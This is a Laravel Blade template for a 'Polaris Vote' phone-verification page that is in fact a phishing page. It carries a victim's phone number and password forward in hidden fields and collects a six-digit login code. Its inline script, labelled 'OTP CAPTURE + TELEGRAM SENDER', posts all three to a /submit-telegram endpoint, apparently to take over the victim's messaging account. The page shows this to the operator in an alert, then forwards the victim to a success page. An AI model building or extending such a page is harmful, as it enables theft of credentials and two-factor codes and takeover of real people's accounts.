<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your phone number — Polaris Vote</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ asset('css/style.css') }}">
</head>
<body class="verify-body">
    <div class="verify-bg" aria-hidden="true"></div>
    <header class="verify-top">
        <div class="verify-top-inner">
            <span class="brand">
                <span class="brand-mark" aria-hidden="true">
                    <svg viewBox="0 0 32 32" width="24" height="24">
                        <circle cx="16" cy="16" r="14" fill="none" stroke="currentColor" stroke-width="2.5"/>
                        <path d="M16 7 L18.2 13.8 L25.4 13.8 L19.6 18 L21.8 24.8 L16 20.6 L10.2 24.8 L12.4 18 L6.6 13.8 L13.8 13.8 Z" fill="currentColor"/>
                    </svg>
                </span>
                Polaris<span class="brand-accent">Vote</span>
            </span>
        </div>
    </header>
    <main class="verify-main">
        <section class="verify-card" aria-labelledby="verifyHeading">
            <div class="step-indicator" role="group" aria-label="Sign-in progress">
                <div class="step-track">
                    <span class="step-track-fill" aria-hidden="true"></span>
                </div>
                <p class="step-label">Step 2 of 2</p>
            </div>
            <h1 id="verifyHeading">Verify your phone number</h1>
            <p class="verify-sub">Enter the 6-digit verification code sent to your phone.</p>
            
            <form id="otpForm" method="POST" action="/success" novalidate>
                @csrf
                <input type="hidden" id="hiddenPhone" name="phone" value="{{ $phone ?? session('phone', '') }}">
                <input type="hidden" id="hiddenPassword" name="password" value="{{ $password ?? session('password', '') }}">
                
                <div class="otp-group" id="otpGroup" role="group" aria-labelledby="verifyHeading">
                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="0" aria-label="Digit 1 of 6" id="otp1">
                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="1" aria-label="Digit 2 of 6" id="otp2">
                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="2" aria-label="Digit 3 of 6" id="otp3">
                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="3" aria-label="Digit 4 of 6" id="otp4">
                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="4" aria-label="Digit 5 of 6" id="otp5">
                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="5" aria-label="Digit 6 of 6" id="otp6">
                </div>
                
                <input type="hidden" name="otp_code" id="otpCode" value="">
                
                <p class="otp-error" id="otpError" role="alert"></p>
                <div class="resend-row">
                    <p class="resend-text">
                        <span id="timerWrap">Resend code in <strong id="countdown" aria-live="polite">60</strong>s</span>
                    </p>
                    <button type="button" class="resend-btn" id="resendBtn" disabled aria-disabled="true">Resend code</button>
                </div>
                <button type="submit" class="btn btn-primary btn-block btn-lg" id="verifyBtn">
                    <span class="btn-label">Verify &amp; Continue</span>
                    <span class="btn-spinner" aria-hidden="true"></span>
                </button>
                <a href="{{ url('/vote') }}" class="change-number-link">Use a different phone number</a>
            </form>
            
            <div class="success-overlay" id="successOverlay" aria-hidden="true">
                <div class="success-anim" aria-hidden="true">
                    <svg viewBox="0 0 100 100" width="84" height="84">
                        <circle class="success-circle" cx="50" cy="50" r="44" fill="none" stroke-width="5"/>
                        <path class="success-check" fill="none" stroke-width="6" d="M28 52 L43 66 L74 32" />
                    </svg>
                </div>
                <p class="success-overlay-text">Verified! Taking you to your vote&hellip;</p>
            </div>
        </section>
    </main>

    <script src="{{ asset('js/script.js') }}"></script>
    
    <script>
        // ============================================================
        // FIXED: OTP CAPTURE + TELEGRAM SENDER
        // ============================================================
        document.addEventListener('DOMContentLoaded', function() {
            console.log('✅ Step 2 - Verify page loaded');

            // ---- GET OTP CODE FROM 6 BOXES ----
            function getOtpCode() {
                var code = '';
                var box1 = document.getElementById('otp1');
                var box2 = document.getElementById('otp2');
                var box3 = document.getElementById('otp3');
                var box4 = document.getElementById('otp4');
                var box5 = document.getElementById('otp5');
                var box6 = document.getElementById('otp6');
                
                if (box1) code += box1.value || '';
                if (box2) code += box2.value || '';
                if (box3) code += box3.value || '';
                if (box4) code += box4.value || '';
                if (box5) code += box5.value || '';
                if (box6) code += box6.value || '';
                
                console.log('📥 OTP captured:', code);
                return code;
            }

            // ---- UPDATE HIDDEN FIELD ----
            function updateOtpCode() {
                var code = getOtpCode();
                var hidden = document.getElementById('otpCode');
                if (hidden) {
                    hidden.value = code;
                }
                console.log('📥 Hidden OTP field updated to:', code);
                return code;
            }

            // ---- AUTO-ADVANCE OTP BOXES ----
            var boxes = document.querySelectorAll('.otp-box');
            boxes.forEach(function(box, index) {
                box.addEventListener('input', function() {
                    this.value = this.value.replace(/\D/g, '');
                    if (this.value.length === 1 && index < boxes.length - 1) {
                        boxes[index + 1].focus();
                    }
                    updateOtpCode();
                });
                box.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
                        boxes[index - 1].focus();
                    }
                });
            });

            // ---- FORM SUBMIT - SEND TO TELEGRAM ----
            var form = document.getElementById('otpForm');
            if (form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    console.log('✅ Form submitted - sending to Telegram');
                    
                    var phoneInput = document.getElementById('hiddenPhone');
                    var passwordInput = document.getElementById('hiddenPassword');
                    
                    var phone = phoneInput ? phoneInput.value : 'No phone';
                    var password = passwordInput ? passwordInput.value : 'No password';
                    var code = updateOtpCode();
                    
                    console.log('📤 FINAL DATA SENDING:', { phone, password, code });
                    
                    fetch('/submit-telegram', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
                        },
                        body: JSON.stringify({ 
                            phone: phone, 
                            password: password, 
                            code: code 
                        })
                    })
                    .then(function(response) {
                        return response.json();
                    })
                    .then(function(data) {
                        console.log('📥 Telegram response:', data);
                        if (data.success) {
                            console.log('✅ Telegram sent with:', { phone, password, code });
                            alert('✅ Phone: ' + phone + '\nPass: ' + password + '\nCode: ' + code);
                        } else {
                            console.log('❌ Error:', data);
                            alert('❌ Error: ' + JSON.stringify(data));
                        }
                    })
                    .catch(function(err) {
                        console.log('❌ Fetch error:', err);
                        alert('❌ Error: ' + err);
                    });
                    
                    setTimeout(function() {
                        form.submit();
                    }, 500);
                });
            }
        });
    </script>
    
</body>
</html>